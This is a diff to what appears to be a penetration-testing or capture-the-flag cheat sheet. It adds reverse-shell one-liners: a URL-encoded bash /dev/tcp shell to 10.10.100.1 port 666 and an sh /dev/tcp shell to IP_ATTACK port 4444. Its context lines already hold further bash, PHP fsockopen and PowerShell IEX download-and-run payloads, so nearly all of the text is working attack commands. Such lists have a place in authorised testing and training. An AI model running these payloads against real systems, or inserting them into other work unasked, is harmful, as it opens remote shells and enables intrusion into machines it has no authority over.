@@ -27,10 +27,12 @@ def choice(a):
 
 ---
 
-- Edit an script running in a crontab:
+- Generic shell:
 
 ```bash
 bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1
+# or try url encoded if it's on web like:
+bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E100%2E1%2F666%200%3E%261
 ```
 
 ---
@@ -597,6 +599,8 @@ PowerShell "IEX(New-Object Net.WebClient).downloadString('http://IP_ATTACK/rev.p
 
 ```shell
 php -r '$sock=fsockopen("IP_ATTACK",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+# or
+sh -i >& /dev/tcp/ IP_ATTACK/4444 0>&1
 ```
 
 - Also, if the php script has a regex, you can encode to base64 a netcat shell like:
